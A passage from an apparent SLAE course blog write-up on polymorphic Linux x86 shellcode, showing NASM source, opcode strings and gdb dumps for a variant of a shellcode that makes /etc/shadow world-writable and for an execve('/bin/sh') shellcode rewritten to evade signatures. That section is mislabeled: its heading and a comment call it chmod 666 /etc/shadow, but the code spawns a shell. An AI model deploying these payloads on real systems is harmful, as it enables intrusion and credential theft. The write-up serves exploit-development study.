+   <span class="mh">0x08048093</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x08048095</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">cx</span><span class="p">,</span><span class="mh">0x1b6</span>
+   <span class="mh">0x08048099</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x08048099</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048099</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048099</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">eax</span>            <span class="mh">0xf</span>	<span class="mi">15</span>
+<span class="n">ecx</span>            <span class="mh">0x1b6</span>	<span class="mi">438</span>
+<span class="n">edx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">ebx</span>            <span class="mh">0xbffff6f0</span>	<span class="o">-</span><span class="mi">1073744144</span>
+<span class="n">esp</span>            <span class="mh">0xbffff6f0</span>	<span class="mh">0xbffff6f0</span>
+<span class="n">ebp</span>            <span class="mh">0x0</span>	<span class="mh">0x0</span>
+<span class="n">esi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">eip</span>            <span class="mh">0x8048099</span>	<span class="mh">0x8048099</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;</span>
+<span class="n">eflags</span>         <span class="mh">0x202</span>	<span class="err">[</span> <span class="n">IF</span> <span class="err">]</span>
+<span class="n">cs</span>             <span class="mh">0x73</span>	<span class="mi">115</span>
+<span class="n">ss</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">ds</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">es</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">bx</span> <span class="mh">0xbffff6f0</span>
+<span class="mh">0xbffff6f0</span><span class="o">:</span>	<span class="mh">0x2f</span>	<span class="mh">0x2f</span>	<span class="mh">0x65</span>	<span class="mh">0x74</span>	<span class="mh">0x63</span>	<span class="mh">0x2f</span>	<span class="mh">0x73</span>	<span class="mh">0x68</span>
+<span class="mh">0xbffff6f8</span><span class="o">:</span>	<span class="mh">0x61</span>	<span class="mh">0x64</span>	<span class="mh">0x6f</span>	<span class="mh">0x77</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <h4 id="disassembly-of-the-polymorphic-shellcode-1">Disassembly of the Polymorphic Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">chmod</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">chmod</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048080</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">chmod</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048080</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">_start</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048080</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x8</span>
+   <span class="mh">0x08048082</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">al</span><span class="p">,</span><span class="n">al</span>
+   <span class="mh">0x08048084</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">dec</span>    <span class="n">al</span>
+   <span class="mh">0x08048086</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="k">cdq</span>    
+   <span class="mh">0x08048087</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ecx</span>
+   <span class="mh">0x08048088</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x776f</span>
+   <span class="mh">0x0804808c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x6461</span>
+   <span class="mh">0x08048090</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x6873</span>
+   <span class="mh">0x08048094</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x2f63</span>
+   <span class="mh">0x08048098</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x7465</span>
+   <span class="mh">0x0804809c</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x2f2f</span>
+   <span class="mh">0x080480a0</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x080480a2</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">cx</span><span class="p">,</span><span class="mh">0x1b6</span>
+   <span class="mh">0x080480a6</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x080480a6</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x80480a6</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x080480a6</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">eax</span>            <span class="mh">0xf</span>	<span class="mi">15</span>
+<span class="n">ecx</span>            <span class="mh">0x1b6</span>	<span class="mi">438</span>
+<span class="n">edx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">ebx</span>            <span class="mh">0xbffff700</span>	<span class="o">-</span><span class="mi">1073744128</span>
+<span class="n">esp</span>            <span class="mh">0xbffff700</span>	<span class="mh">0xbffff700</span>
+<span class="n">ebp</span>            <span class="mh">0x0</span>	<span class="mh">0x0</span>
+<span class="n">esi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">eip</span>            <span class="mh">0x80480a6</span>	<span class="mh">0x80480a6</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;</span>
+<span class="n">eflags</span>         <span class="mh">0x216</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">AF</span> <span class="n">IF</span> <span class="err">]</span>
+<span class="n">cs</span>             <span class="mh">0x73</span>	<span class="mi">115</span>
+<span class="n">ss</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">ds</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">es</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">bx</span> <span class="mh">0xbffff700</span>
+<span class="mh">0xbffff700</span><span class="o">:</span>	<span class="mh">0x2f</span>	<span class="mh">0x2f</span>	<span class="mh">0x65</span>	<span class="mh">0x74</span>	<span class="mh">0x63</span>	<span class="mh">0x2f</span>	<span class="mh">0x73</span>	<span class="mh">0x68</span>
+<span class="mh">0xbffff708</span><span class="o">:</span>	<span class="mh">0x61</span>	<span class="mh">0x64</span>	<span class="mh">0x6f</span>	<span class="mh">0x77</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <p>After comparing the state of the general purpose registers and values on the stack in both the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.</p> <p>In addition, the size of the original shellcode is 27 bytes. The size of the polymorphic shellcode is 40 bytes, meeting the size restrictions set by SecurityTube.</p> <h3 id="shellcode-3---chmod-666-etcshadow">Shellcode 3 - chmod 666 /etc/shadow</h3> <p>The author of the original shellcode is “kernel_panik”. The code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-752.php">here</a>.</p> <h4 id="original-shellcode-2">Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes</span>
+<span class="c">;Date     : 10 Feb 2011</span>
+<span class="c">;Author   : kernel_panik</span>
+<span class="c">;Thanks   : cOokie, agix, antrhacks</span>
+
+<span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+
+<span class="n">_start</span><span class="o">:</span>
+ <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+ <span class="k">mul</span> <span class="n">ecx</span>
+ <span class="k">push</span> <span class="n">ecx</span>
+ <span class="k">push</span> <span class="mh">0x68732f2f</span>   <span class="c">;; hs//</span>
+ <span class="k">push</span> <span class="mh">0x6e69622f</span>   <span class="c">;; nib/</span>
+ <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
+ <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>
+ <span class="k">int</span> <span class="mh">0x80</span>
+</code></pre></div> <h4 id="compiling-the-original-shellcode-2">Compiling the Original Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack-original
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+[+] Size: 21 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="polymorphic-shellcode-2">Polymorphic Shellcode</h4> <p>The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/execve-stack-bin-sh.nasm">here</a></p> <p>Below is an explanation of the changes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;execve-stack-bin-sh.nasm</span>
+<span class="c">;this changes the permissions for /etc/shadow to 666</span>
+<span class="c">;Linux x86</span>
+<span class="c">;Saniv Kawa (@skawasec)</span>
+<span class="c">;www.popped.io</span>
+<span class="c">;December 6, 2016</span>
+<span class="c">;29 bytes</span>
+<span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+
+<span class="n">_start</span><span class="o">:</span>
+  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span> <span class="c">;zero out EBX</span>
+  <span class="k">push</span> <span class="n">ebx</span> <span class="c">;push 0 on to the stack</span>
+  <span class="k">pop</span> <span class="n">eax</span> <span class="c">;pop 0 off the stack and zero out EAX</span>
+  <span class="k">push</span> <span class="n">eax</span> <span class="c">;null terminate</span>
+  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mi">6</span> <span class="c">;arithmetic for AL register</span>
+  <span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="n">bl</span> <span class="c">;arithmetic for AL register</span>
+  <span class="k">dec</span> <span class="n">bl</span> <span class="c">;arithmetic for AL register</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x6873</span> <span class="c">;hs</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x2f2f</span> <span class="c">;//</span>
+  <span class="k">push</span> <span class="mh">0x6e69622f</span> <span class="c">;nib/</span>
+  <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;stack pointer</span>
+  <span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ebx</span> <span class="c">;EAX now contains the correct syscall value, 11.  </span>
+                <span class="c">;EBX contians the stack pointer</span>
+  <span class="k">int</span> <span class="mh">0x80</span>
+</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode-2">Compiling the Polymorphic Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\x31\xdb\x53\x58\x50\xb3\x06\x00\xdb\xfe\xcb\x66\x68\x73\x68\x66\x68\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe0\x93\xcd\x80"
+[+] Size: 29 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="disassembly-of-the-original-shellcode-2">Disassembly of the Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">original</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">original</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048080</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">original</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048080</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">_start</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048080</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
+   <span class="mh">0x08048082</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">mul</span>    <span class="n">ecx</span>
+   <span class="mh">0x08048084</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ecx</span>
+   <span class="mh">0x08048085</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x68732f2f</span>
+   <span class="mh">0x0804808a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x6e69622f</span>
+   <span class="mh">0x0804808f</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x08048091</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xb</span>
+   <span class="mh">0x08048093</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x08048093</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048093</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048093</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">eax</span>            <span class="mh">0xb</span>	<span class="mi">11</span>
+<span class="n">ecx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">ebx</span>            <span class="mh">0xbffff6d4</span>	<span class="o">-</span><span class="mi">1073744172</span>
+<span class="n">esp</span>            <span class="mh">0xbffff6d4</span>	<span class="mh">0xbffff6d4</span>
+<span class="n">ebp</span>            <span class="mh">0x0</span>	<span class="mh">0x0</span>
+<span class="n">esi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">eip</span>            <span class="mh">0x8048093</span>	<span class="mh">0x8048093</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;</span>
+<span class="n">eflags</span>         <span class="mh">0x206</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">IF</span> <span class="err">]</span>
+<span class="n">cs</span>             <span class="mh">0x73</span>	<span class="mi">115</span>
+<span class="n">ss</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">ds</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">es</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">bx</span> <span class="mh">0xbffff6d4</span>
+<span class="mh">0xbffff6d4</span><span class="o">:</span>	<span class="mh">0x2f</span>	<span class="mh">0x62</span>	<span class="mh">0x69</span>	<span class="mh">0x6e</span>	<span class="mh">0x2f</span>	<span class="mh">0x2f</span>	<span class="mh">0x73</span>	<span class="mh">0x68</span>
+<span class="mh">0xbffff6dc</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <h4 id="disassembly-of-the-polymorphic-shellcode-2">Disassembly of the Polymorphic Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048080</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048080</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">_start</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048080</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
+   <span class="mh">0x08048082</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebx</span>
+   <span class="mh">0x08048083</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">eax</span>
+   <span class="mh">0x08048084</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">eax</span>
+   <span class="mh">0x08048085</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">bl</span><span class="p">,</span><span class="mh">0x6</span>
+   <span class="mh">0x08048087</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">bl</span><span class="p">,</span><span class="n">bl</span>
+   <span class="mh">0x08048089</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="k">dec</span>    <span class="n">bl</span>
+   <span class="mh">0x0804808b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x6873</span>
+   <span class="mh">0x0804808f</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="n">pushw</span>  <span class="mh">0x2f2f</span>
+   <span class="mh">0x08048093</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x6e69622f</span>
+   <span class="mh">0x08048098</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x0804809a</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="k">xchg</span>   <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x0804809b</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x0804809b</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x804809b</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0804809b</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">eax</span>            <span class="mh">0xb</span>	<span class="mi">11</span>
+<span class="n">ecx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">ebx</span>            <span class="mh">0xbffff6e4</span>	<span class="o">-</span><span class="mi">1073744156</span>
+<span class="n">esp</span>            <span class="mh">0xbffff6e4</span>	<span class="mh">0xbffff6e4</span>
+<span class="n">ebp</span>            <span class="mh">0x0</span>	<span class="mh">0x0</span>
+<span class="n">esi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">eip</span>            <span class="mh">0x804809b</span>	<span class="mh">0x804809b</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;</span>
+<span class="n">eflags</span>         <span class="mh">0x202</span>	<span class="err">[</span> <span class="n">IF</span> <span class="err">]</span>
+<span class="n">cs</span>             <span class="mh">0x73</span>	<span class="mi">115</span>
+<span class="n">ss</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
